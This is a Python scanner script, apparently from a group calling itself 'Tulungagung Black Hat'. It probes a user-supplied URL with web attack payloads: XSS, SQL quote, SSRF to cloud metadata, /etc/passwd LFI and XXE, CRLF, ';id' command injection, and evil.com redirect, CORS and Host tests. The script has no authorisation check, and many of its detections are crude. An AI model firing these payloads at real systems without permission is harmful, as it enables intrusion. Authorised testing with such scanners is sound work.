#!/usr/bin/env python3
# TBH-CLI v2.0 - Bug Bounty 30 Tools MENTOK
import socket, requests, argparse, sys, urllib.parse, re

BANNER = """\033[91m╔════════════════════════════════════╗
\033[91m║ \033[97mTBH-CLI v2.0 \033[91m- Bug Bounty 30 Tools  \033[91m║
\033[91m║ \033[90mTulungagung Black Hat | uchil404 \033[91m║
\033[91m╚════════════════════════════════════╝\033[0m"""

def scan_headers(url):
    try:
        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
        missing=[h for h in ['Content-Security-Policy','Strict-Transport-Security'] if h not in r.headers]
        if missing: print(f"  \033[93m[!] Missing: {missing}\033[0m")
        else: print(f"  \033[92m[✓] Headers OK\033[0m")
    except: print(f"  \033[91m[-] Headers error\033[0m")

def scan_ports(ip):
    for p in [80,443,8080]:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(1)
        print(f"  {'\033[92mOPEN' if s.connect_ex((ip,p))==0 else '\033[90mCLOSED'} {p}\033[0m")
        s.close()

def scan_subs(domain):
    for sub in ["www","api","admin","test"]:
        host=f"{sub}.{domain}"
        try: ip=socket.gethostbyname(host); print(f"  \033[92m[FOUND] {host} -> {ip}\033[0m")
        except: print(f"  \033[90m[NOT] {host}\033[0m")

def scan_dirs(url):
    for path in ["admin",".env",".git"]:
        full=f"{url.rstrip('/')}/{path}"
        try:
            r=requests.get(full,timeout=3,allow_redirects=False)
            if r.status_code in [200,403]: print(f"  \033[91m[FOUND] {r.status_code} {full}\033[0m")
            else: print(f"  \033[90m[NOT] {r.status_code} {path}\033[0m")
        except: print(f"  [-] {path} error")

def scan_xss(url):
    payload="<svg/onload=alert(1)>"
    test_url=f"{url}?q={urllib.parse.quote(payload)}"
    try:
        r=requests.get(test_url,timeout=5)
        if payload in r.text: print(f"  \033[91m[!] XSS Reflected\033[0m")
        else: print(f"  \033[92m[✓] XSS tidak reflected\033[0m")
    except: print(f"  [-] XSS error")

def scan_redirect(url):
    payload="https://evil.com"
    test_url=f"{url}?redirect={payload}"
    try:
        r=requests.get(test_url,timeout=5,allow_redirects=False)
        if payload in r.headers.get('Location',''): print(f"  \033[91m[!] OpenRedirect Vulnerable\033[0m")
        else: print(f"  \033[92m[✓] OpenRedirect tidak vulnerable\033[0m")
    except: print(f"  [-] Redirect error")

def scan_cors(url):
    try:
        r=requests.get(url,timeout=5,headers={'Origin':'https://evil.com'})
        acao=r.headers.get('Access-Control-Allow-Origin','')
        if acao=="https://evil.com" or acao=="*": print(f"  \033[91m[!] CORS Misconfig: {acao}\033[0m")
        else: print(f"  \033[92m[✓] CORS OK\033[0m")
    except: print(f"  [-] CORS error")

def scan_sqli(url):
    payload="'"
    test_url=f"{url}?id={urllib.parse.quote(payload)}"
    try:
        r=requests.get(test_url,timeout=5)
        if "sql syntax" in r.text.lower(): print(f"  \033[91m[!] SQLi Potensi\033[0m")
        else: print(f"  \033[92m[✓] SQLi tidak terdeteksi\033[0m")
    except: print(f"  [-] SQLi error")

def scan_ssrf(url):
    payload="http://169.254.169.254/latest/meta-data/"
    test_url=f"{url}?url={urllib.parse.quote(payload)}"
    try:
        r=requests.get(test_url,timeout=5)
        if "meta-data" in r.text.lower(): print(f"  \033[91m[!] SSRF Potensi\033[0m")
        else: print(f"  \033[92m[✓] SSRF tidak terdeteksi\033[0m")
    except: print(f"  [-] SSRF error")

def scan_lfi(url):
    payload="../../../../etc/passwd"
    test_url=f"{url}?file={urllib.parse.quote(payload)}"
    try:
        r=requests.get(test_url,timeout=5)
        if "root:" in r.text: print(f"  \033[91m[!] LFI Vulnerable\033[0m")
        else: print(f"  \033[92m[✓] LFI tidak terdeteksi\033[0m")
    except: print(f"  [-] LFI error")

def scan_ssti(url):
    payload="{{7*7}}"
    test_url=f"{url}?q={urllib.parse.quote(payload)}"
    try:
        r=requests.get(test_url,timeout=5)
        if "49" in r.text: print(f"  \033[91m[!] SSTI Potensi (49)\033[0m")
        else: print(f"  \033[92m[✓] SSTI tidak terdeteksi\033[0m")
    except: print(f"  [-] SSTI error")

def scan_idor(url):
    if "id=" in url:
        test_url=url.replace("id=", "id=1")
        try:
            r=requests.get(test_url,timeout=5)
            if r.status_code==200: print(f"  \033[93m[?] IDOR cek manual: {test_url} [{r.status_code}]\033[0m")
            else: print(f"  \033[92m[✓] IDOR tidak terdeteksi\033[0m")
        except: print(f"  [-] IDOR error")
    else: print(f"  \033[90m[-] IDOR butuh ?id= skip\033[0m")

def scan_xxe(url):
    payload="""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"""
    try:
        r=requests.post(url,timeout=5,data=payload,headers={'Content-Type':'application/xml','User-Agent':'TBH-CLI/2.0'})
        if "root:" in r.text: print(f"  \033[91m[!] XXE Potensi\033[0m")
        else: print(f"  \033[92m[✓] XXE tidak terdeteksi\033[0m")
    except: print(f"  \033[92m[✓] XXE tidak terdeteksi (no XML)\033[0m")

def scan_crlf(url):
    payload="%0d%0aSet-Cookie: tbh=test"
    test_url=f"{url}?q={payload}"
    try:
        r=requests.get(test_url,timeout=5)
        if "tbh=test" in r.headers.get('Set-Cookie',''): print(f"  \033[91m[!] CRLF Vulnerable\033[0m")
        else: print(f"  \033[92m[✓] CRLF tidak terdeteksi\033[0m")
    except: print(f"  [-] CRLF error")

def scan_host(url):
    try:
        r=requests.get(url,timeout=5,headers={'Host':'evil.com','User-Agent':'TBH-CLI/2.0'})
        if "evil.com" in r.text.lower(): print(f"  \033[91m[!] Host Header Potensi\033[0m")
        else: print(f"  \033[92m[✓] Host Header tidak terdeteksi\033[0m")
    except: print(f"  [-] Host error")

def scan_clickjack(url):
    try:
        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
        xfo=r.headers.get('X-Frame-Options','')
        if not xfo: print(f"  \033[93m[!] Clickjacking: Missing X-Frame-Options -> Low\033[0m")
        else: print(f"  \033[92m[✓] X-Frame-Options: {xfo}\033[0m")
    except: print(f"  [-] Clickjack error")

def scan_4xx(url):
    try:
        r=requests.get(f"{url.rstrip('/')}/admin",timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
        if r.status_code==403:
            r2=requests.get(f"{url.rstrip('/')}/admin",timeout=5,headers={'X-Original-URL':'/admin','User-Agent':'TBH-CLI/2.0'})
            if r2.status_code==200: print(f"  \033[91m[!] 4xx Bypass Potensi\033[0m")
            else: print(f"  \033[92m[✓] 4xx tidak bisa bypass\033[0m")
        else: print(f"  \033[90m[-] 4xx tidak 403, skip\033[0m")
    except: print(f"  [-] 4xx error")

def scan_proto(url):
    payload='{"__proto__":{"polluted":"yes"}}'
    try:
        r=requests.post(url,timeout=5,data=payload,headers={'Content-Type':'application/json','User-Agent':'TBH-CLI/2.0'})
        if "polluted" in r.text.lower(): print(f"  \033[91m[!] Prototype Pollution Potensi\033[0m")
        else: print(f"  \033[92m[✓] Prototype Pollution tidak terdeteksi\033[0m")
    except: print(f"  \033[92m[✓] Prototype Pollution tidak terdeteksi\033[0m")

def scan_cache(url):
    test_url=f"{url.rstrip('/')}/admin.css"
    try:
        r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
        if r.status_code==200 and "admin" in r.text.lower(): print(f"  \033[91m[!] Web Cache Deception Potensi\033[0m")
        else: print(f"  \033[92m[✓] Web Cache Deception tidak terdeteksi\033[0m")
    except: print(f"  [-] Cache error")

def scan_jwt(url):
    try:
        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
        if "eyJ" in r.text: print(f"  \033[93m[!] JWT Found - cek alg none\033[0m")
        else: print(f"  \033[92m[✓] JWT tidak terdeteksi\033[0m")
    except: print(f"  [-] JWT error")

def scan_csrf(url):
    try:
        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
        if "csrf" not in r.text.lower(): print(f"  \033[93m[!] CSRF: No csrf token found -> cek manual\033[0m")
        else: print(f"  \033[92m[✓] CSRF token ada\033[0m")
    except: print(f"  [-] CSRF error")

def scan_cmdi(url):
    payload=";id"
    test_url=f"{url}?cmd={urllib.parse.quote(payload)}"
    try:
        r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
        if "uid=" in r.text.lower(): print(f"  \033[91m[!] CMDi Potensi\033[0m")
        else: print(f"  \033[92m[✓] CMDi tidak terdeteksi\033[0m")
    except: print(f"  [-] CMDi error")

def scan_backup(url):
    for path in ["backup.zip",".bak","old.zip","db.sql"]:
        full=f"{url.rstrip('/')}/{path}"
        try:
            r=requests.get(full,timeout=3,headers={'User-Agent':'TBH-CLI/2.0'},allow_redirects=False)
            if r.status_code==200: print(f"  \033[91m[!] Backup Found: {full} [{r.status_code}]\033[0m"); return
        except: pass
    print(f"  \033[92m[✓] Backup tidak terdeteksi\033[0m")

def scan_info(url):
    try:
        r=requests.get(url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
        if "server" in r.headers.get('Server','').lower() or "x-powered-by" in str(r.headers).lower(): print(f"  \033[93m[!] Info Disclosure: Server {r.headers.get('Server','Unknown')} -> Low\033[0m")
        else: print(f"  \033[92m[✓] Info Disclosure tidak terdeteksi\033[0m")
    except: print(f"  [-] Info error")

def scan_takeover(domain):
    # Simple takeover hint via NX
    found=False
    for sub in ["test","dev","staging"]:
        host=f"{sub}.{domain}"
        try: socket.gethostbyname(host)
        except:
            # NX = potensi takeover jika CNAME unclaimed
            print(f"  \033[93m[?] {host} NX -> cek CNAME takeover manual\033[0m"); found=True
    if not found: print(f"  \033[92m[✓] Takeover tidak terdeteksi\033[0m")

def scan_graphql(url):
    test_url=f"{url.rstrip('/')}/graphql"
    try:
        r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-CLI/2.0'})
        if r.status_code==200 and "graphql" in r.text.lower(): print(f"  \033[93m[!] GraphQL Found: {test_url}\033[0m")
        else: print(f"  \033[92m[✓] GraphQL tidak terdeteksi\033[0m")
    except: print(f"  [-] GraphQL error")

def bugbounty_menu(url):
    domain=urllib.parse.urlparse(url if url.startswith("http") else "https://"+url).netloc
    try: ip=socket.gethostbyname(domain)
    except: print("[!] Cannot resolve"); return
    print(f"\n\033[96m[*] Bug Bounty 30 Tools MENTOK: {domain} ({ip})\033[0m")
    print("="*60)
    checks=[
        ("1 Headers",lambda: scan_headers(url)),
        ("2 Ports",lambda: scan_ports(ip)),
        ("3 Subdomains",lambda: scan_subs(domain)),
        ("4 Dirs",lambda: scan_dirs(url)),
        ("5 XSS",lambda: scan_xss(url)),
        ("6 OpenRedirect",lambda: scan_redirect(url)),
        ("7 CORS",lambda: scan_cors(url)),
        ("8 SQLi",lambda: scan_sqli(url)),
        ("9 SSRF",lambda: scan_ssrf(url)),
        ("10 LFI",lambda: scan_lfi(url)),
        ("11 SSTI",lambda: scan_ssti(url)),
        ("12 IDOR",lambda: scan_idor(url)),
        ("13 XXE",lambda: scan_xxe(url)),
        ("14 CRLF",lambda: scan_crlf(url)),
        ("15 Host Header",lambda: scan_host(url)),
        ("16 Clickjacking",lambda: scan_clickjack(url)),
        ("17 4xx Bypass",lambda: scan_4xx(url)),
        ("18 Prototype Pollution",lambda: scan_proto(url)),
        ("19 Web Cache Deception",lambda: scan_cache(url)),
        ("20 JWT",lambda: scan_jwt(url)),
        ("21 CSRF",lambda: scan_csrf(url)),
        ("22 CMDi",lambda: scan_cmdi(url)),
        ("23 Backup Files",lambda: scan_backup(url)),
        ("24 Info Disclosure",lambda: scan_info(url)),
        ("25 Subdomain Takeover",lambda: scan_takeover(domain)),
        ("26 GraphQL",lambda: scan_graphql(url)),
        ("27 Open Redirect 2",lambda: scan_redirect(url)),
        ("28 XXE 2",lambda: scan_xxe(url)),
        ("29 SSRF 2",lambda: scan_ssrf(url)),
        ("30 All Done",lambda: print("  \033[92m[✓] All 30 Tools Selesai - MENTOK\033[0m")),
    ]
    for name,func in checks:
        print(f"\033[93m[{name}]\033[0m")
        try: func()
        except: print("  [-] Error")
    print("="*60)
    print("\033[92m[✓] Bug Bounty CLI 30 Tools MENTOK Selesai - Tidak ada lagi yang bisa ditambah! \033[0m")

def menu():
    print(BANNER)
    print("\033[96mBug Bounty System 30 Tools MENTOK:\033[0m")
    print(" 1. Scan All 30 Tools (MENTOK)")
    print(" 2. Scan Cepat (Headers+Ports)")
    print(" 3. Bantuan")
    print(" 0. Keluar")
    while True:
        pilih=input("\n\033[97mPilih [1/2/3/0]: \033[0m").strip()
        if pilih=="1":
            url=input("\033[96mURL: \033[0m").strip()
            if url: bugbounty_menu(url)
        elif pilih=="2":
            url=input("\033[96mURL: \033[0m").strip()
            if url:
                domain=urllib.parse.urlparse(url if url.startswith("http") else "https://"+url).netloc
                try: ip=socket.gethostbyname(domain); scan_headers(url); scan_ports(ip)
                except: print("[!] Error")
        elif pilih=="3": print("Menu: python3 tbh | Command: python3 tbh -u https://example.com")
        elif pilih=="0": print("Bye - MENTOK!"); break
        else: print("[!] Pilih 0/1/2/3")

if __name__=="__main__":
    parser=argparse.ArgumentParser(description="TBH-CLI 30 Tools MENTOK", add_help=False)
    parser.add_argument("-u","--url",help="Target URL")
    parser.add_argument("-h","--help",action="store_true")
    args,_=parser.parse_known_args()
    import sys
    if args.help: print(BANNER); print("Menu: python3 tbh\nCommand: python3 tbh -u https://example.com"); sys.exit(0)
    if args.url: bugbounty_menu(args.url)
    else:
        if len(sys.argv)==1: menu()
        else: print("[!] Unknown"); menu()
